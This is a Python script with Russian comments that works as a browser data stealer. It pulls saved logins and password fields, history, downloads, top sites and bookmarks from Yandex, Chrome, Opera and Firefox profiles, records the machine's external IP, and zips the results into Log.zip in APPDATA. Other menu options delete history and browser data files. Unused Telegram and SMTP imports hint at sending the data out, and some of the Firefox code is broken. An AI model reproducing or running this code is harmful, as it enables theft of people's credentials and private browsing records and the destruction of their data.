import win32crypt
import sqlite3
import platform
import requests
import os
import getpass
import time
import datetime
import json
import telebot
import constant
import zipfile
import mimetypes
import subprocess,smtplib



ip_ad = requests.get("https://ramziv.com/ip").text
header = '\n'*2 +  '*' * 20 + '\n'*2
def YaCook():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT action_url,username_value,password_value from logins')
    his = cur.fetchall()
    for i in his:
        password = i[2]
        name = i[1]
        url = i[0]
        text = text + ('Url:'+url+ '\n'+ "Login:"+name+ '\n' +'Password:' + str(password)) + '\n' + '\n'
    return text

def YaTopSite():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Top Sites')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT url,url_rank,title from top_sites')
    his = cur.fetchall()
    for i in his:
        url = i[0]
        numb = i[1] + 1
        name = i[2]
        text = text + ('Top Site:'+str(numb)+ '\n'+ "Name:"+name+ '\n' +'Url:' + url + '\n' + '\n')
    return text


def YaDow():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\History')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  current_path,start_time from downloads')
    his = cur.fetchall()
    for i in his:
        name = i[0]
        data_download = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[1]) 
        text = text + ('Url:'+str(name)+ '\n'+ 'Start time:'+ str(data_download) +  '\n' + '\n')
    return text

def YaBook():
    text = '';
    path = (os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Bookmarks')
    with open(path, 'r', encoding='utf-8') as f:
        t = json.load(f)
        roots = t.get('roots')
        r = roots.get('bookmark_bar').get('children')
        for i in r:
            text = text + str(i) + '\n'
    return (text)

def YaHistory():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\History')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  url,title,last_visit_time from urls')
    his = cur.fetchall()
    for i in his:
        url = i[0]
        name = i[1]
        visit_data = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[2]) 
        text = text + ('Last visit date:'+str(visit_data)+ '\n'+ 'Name:'+ str(name)+'\n'+ 'Url:'+ str(url) +  '\n' + '\n')
    return text

#Переходим к Хрому

def GoogleCook():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT origin_url,username_value,password_value from logins')
    his = cur.fetchall()
    for i in his:
        password =  i[2]
        name = i[1]
        url = i[0]
        text = text + ('Url:'+url+ '\n'+ "Login:"+name+ '\n' +'Password:' + str(password)) + '\n' + '\n'
    return text


def GoogleDow():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\History')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  current_path,start_time from downloads')
    his = cur.fetchall()
    for i in his:
        name = i[0]
        data_download = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[1]) 
        text = text + ('Url:'+str(name)+ '\n'+ 'Start time:'+ str(data_download) +  '\n' + '\n')
    return text

def GoogleTopSite():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Top Sites')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT url,url_rank,title from top_sites')
    his = cur.fetchall()
    for i in his:
        url = i[0]
        numb = i[1] + 1
        name = i[2]
        text = text + ('Top Site:'+str(numb)+ '\n'+ "Name:"+name+ '\n' +'Url:' + url + '\n' + '\n')
    return text

def GoogleHistory():
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\History')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  url,title,last_visit_time from urls')
    his = cur.fetchall()
    for i in his:
        url = i[0]
        name = i[1]
        visit_data = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[2]) 
        text = text + ('Last visit date:'+str(visit_data)+ '\n'+ 'Name:'+ str(name)+'\n'+ 'Url:'+ str(url) +  '\n' + '\n')
    return text

def GoogleBook():
    text = '';
    path = (os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Bookmarks')
    with open(path, 'r', encoding='utf-8') as f:
        t = json.load(f)
        roots = t.get('roots')
        r = roots.get('bookmark_bar').get('children')
        for i in r:
            text = text + str(i) + '\n'
    return (text)

#Переходим к FireFox

def FireCook():
    for d in os.listdir(os.getenv("APPDATA")+r"\\Mozilla\\Firefox\\Profiles"):
      if 'default-release' in d:
        return d
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + os.getenv("APPDATA")+'\\Mozilla\\Firefox\\Profiles\\' + d +'\\cookies.sqlite' )
    cur = a.cursor()
    text = "";
    cur.execute('SELECT hots,value, from moz_cookies')
    his = cur.fetchall()
    for i in his:
        name = i[1]
        url = i[0]
        text = text + ('Url:'+url+ '\n'+ "Login:"+name+  '\n' + '\n')
    return text




def FireHistory():
    for d in os.listdir(os.getenv("APPDATA")+r"\\Mozilla\\Firefox\\Profiles"):
      if 'default-release' in d:
        return(d)
    a = sqlite3.connect(os.getenv("LOCALAPPDATA") + os.getenv("APPDATA")+'\\Mozilla\\Firefox\\Profiles\\' + d + "\\places")
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  url,title,last_visit_time from moz_places')
    his = cur.fetchall()
    for i in his:
        url = i[0]
        name = i[1]
        visit_data = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[2]) 
        text = text + ('Last visit date:'+str(visit_data)+ '\n'+ 'Name:'+ str(name)+'\n'+ 'Url:'+ str(url) +  '\n' + '\n')
    return text





def OperaCook():
    a = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT origin_url,username_value,password_value from logins')
    his = cur.fetchall()
    for i in his:
        password = i[2]
        name = i[1]
        url = i[0]
        text = text + ('Url:'+url+ '\n'+ "Login:"+name+ '\n' +'Password:' + str(password)) + '\n' + '\n'
    return text


def OperaDow():
    a = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\History')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  current_path,start_time from downloads')
    his = cur.fetchall()
    for i in his:
        name = i[0]
        data_download = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[1]) 
        text = text + ('Url:'+str(name)+ '\n'+ 'Start time:'+ str(data_download) +  '\n' + '\n')
    return text



def OperaHistory():
    a = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\History')
    cur = a.cursor()
    text = "";
    cur.execute('SELECT  url,title,last_visit_time from urls')
    his = cur.fetchall()
    for i in his:
        url = i[0]
        name = i[1]
        visit_data = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds = i[2]) 
        text = text + ('Last visit date:'+str(visit_data)+ '\n'+ 'Name:'+ str(name)+'\n'+ 'Url:'+ str(url) +  '\n' + '\n')
    return text

def OperaBook():
    text = '';
    path = (os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Bookmarks')
    with open(path, 'r', encoding='utf-8') as f:
        t = json.load(f)
        roots = t.get('roots')
        r = roots.get('bookmark_bar').get('children')
        for i in r:
            text = text + str(i) + '\n'
    return (text)


#Удаление информации

def DelInfoGoogle():
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default','History')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default','Bookmarks')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default','Top Sites')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default','Login Data')
    os.remove(path)

def DelInfoYandex():
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default','History')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default','Bookmarks')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default','Top Sites')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default','Ya Passman Data')
    os.remove(path)

def DelInfoOpera():
    path = os.path.join(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable','History')
    os.remove(path)
    path = os.path.join(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable','Bookmarks')
    os.remove(path)
    path = os.path.join(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable','Login Data')
    os.remove(path)

def DelInfoFire():
    path = os.path.join(os.getenv("APPDATA")+'\\Mozilla\\Firefox\\Profiles\\' + d ,'cookies.sqlite')
    os.remove(path)
    path = os.path.join(os.getenv("APPDATA")+'\\Mozilla\\Firefox\\Profiles\\' + d ,'places')
    os.remove(path)


#Удаление только истории

def DelAllHistory():
    path = os.path.join(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable','History')
    os.remove(path)
    path = os.path.join(os.getenv("APPDATA")+'\\Mozilla\\Firefox\\Profiles\\' + d ,'places')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default','History')
    os.remove(path)
    path = os.path.join(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default','History')
    os.remove(path)













#Создает файл YaInfo для храния нашей всей информации из Яндекс Браузера

Choose = int(input("Выберите действие:" +'\n' + '1 - запись информации' + '\n' + '2 - удаление истории всех браузеров' + '\n' + '10 - удаление всей информации из браузеров'+ '\n'))
if (Choose == 1):             
    file = open(os.getenv("APPDATA") + '\\YaInfo.txt','w+',encoding='utf-8')
    file.write(ip_ad + header+'YandexCook'+header+'\n'*2 +YaCook())
    file.close()
    file = open(os.getenv("APPDATA")+'\\YaInfo.txt','a+' ,encoding='utf-8')
    file.write(header+'Yandex TopSites'+header + '\n'*2 + YaTopSite())
    file.close()
    file = open(os.getenv("APPDATA")+'\\YaInfo.txt','a+',encoding="utf-8")
    file.write(header+'Yandex Downloads History'+ header + '\n'*2 + YaDow())
    file.close()
    file = open(os.getenv("APPDATA")+'\\YaInfo.txt','a+',encoding="utf-8")
    file.write(header+'Yandex Bookmarks'+ header + '\n'*2 + YaBook())
    file.close()
    file = open(os.getenv("APPDATA")+'\\YaInfo.txt','a+',encoding="utf-8")
    file.write(header+' Yandex History'+ header + '\n'*2 + YaHistory())
    file.close()

    #Теперь Хром

    file = open(os.getenv("APPDATA") + '\\GoogleInfo.txt','w+',encoding='utf-8')
    file.write(header+'GoogleCook'+header+'\n'*2 +GoogleCook())
    file.close()
    file = open(os.getenv("APPDATA") + '\\GoogleInfo.txt','a+',encoding='utf-8')
    file.write(header+'Google TopSites'+header+'\n'*2 +GoogleTopSite())
    file.close()
    file = open(os.getenv("APPDATA") + '\\GoogleInfo.txt','a+',encoding='utf-8')
    file.write(header+'Google Downloads'+header+'\n'*2 +GoogleDow())
    file.close()
    file = open(os.getenv("APPDATA") + '\\GoogleInfo.txt','a+',encoding='utf-8')
    file.write(header+'Google History'+header+'\n'*2 +GoogleHistory())
    file.close()
    file = open(os.getenv("APPDATA")+'\\GoogleInfo.txt','a+',encoding="utf-8")
    file.write(header+'Google Bookmarks'+ header + '\n'*2 + GoogleBook())
    file.close()

    

    file = open(os.getenv("APPDATA") + '\\OperaInfo.txt','w+',encoding='utf-8')
    file.write(header+'OperaCook'+header+'\n'*2 +OperaCook())
    file.close()
    file = open(os.getenv("APPDATA") + '\\OperaInfo.txt','a+',encoding='utf-8')
    file.write(header+'Opera Downloads'+header+'\n'*2 +OperaDow())
    file.close()
    file = open(os.getenv("APPDATA") + '\\OperaInfo.txt','a+',encoding='utf-8')
    file.write(header+'Opera History'+header+'\n'*2 +OperaHistory())
    file.close()
    file = open(os.getenv("APPDATA")+'\\OperaInfo.txt','a+',encoding="utf-8")
    file.write(header+'Opera Bookmarks'+ header + '\n'*2 + OperaBook())
    file.close()

    #FireFox 
    file = open(os.getenv("APPDATA") + '\\FireInfo.txt','w+',encoding='utf-8')
    file.write(header+'FireCook'+header+'\n'*2 +FireCook())
    file.close()
    file = open(os.getenv("APPDATA") + '\\FireInfo.txt','a+',encoding='utf-8')
    file.write(header+'Fire History'+header+'\n'*2 +FireHistory())
    file.close()


    #Запись в общий архив
    zname = os.getenv("APPDATA") + '\\Log.zip'
    arch = zipfile.ZipFile(zname,'w')
    arch.write(os.getenv("APPDATA") + '\\YaInfo.txt')
    arch.write(os.getenv("APPDATA") + '\\GoogleInfo.txt')
    arch.write(os.getenv("APPDATA") + '\\OperaInfo.txt')
    arch.write(os.getenv("APPDATA") + '\\FireInfo.txt')
    arch.close()
    print("Готово")  
elif Choose == 2:
    DelAllHistory()
    print("Готово")            
elif Choose == 10:
     DelInfoOpera()
     DelInfoFire()
     DelInfoGoogle()
     DelInfoYandex()
     print("Готово")
else:
    print('Введите корректное значение')

k=input("press close to exit") 
